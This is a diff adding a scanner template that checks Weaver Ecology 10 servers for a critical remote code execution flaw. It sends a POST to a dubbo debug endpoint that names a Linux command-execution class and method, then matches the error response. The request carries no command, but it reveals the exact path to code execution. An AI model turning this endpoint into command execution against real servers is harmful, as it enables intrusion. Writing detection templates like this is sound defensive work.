@@ -1,0 +1,22 @@
+id: weaver-ecology10-dubbo-debug-rce
+info:
+  name: 泛微 Ecology 10 dubbo 接口 - 远程代码执行漏洞
+  author: Chaitin
+  severity: critical
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: weaver
+    product: ecology10
+  tags: rce,vuln,weaver,ecology10
+http:
+- method: POST
+  path:
+  - '{{BaseURL}}/papi/esearch/data/devops/dubboApi/debug/method?interfaceName=com.weaver.dw.platform.spark.util.LinuxCommand&methodName=execCmdWaitStdOut'
+  headers:
+    Content-Type: application/json
+  body: '[]'
+  matchers:
+  - type: dsl
+    dsl:
+    - 'status_code == 200 && contains(body, ''"code":500'') && contains(body, ''"msg":"系统错误"'') && contains(body, ''"status":false'') && contains(body, ''"fail":true'')'
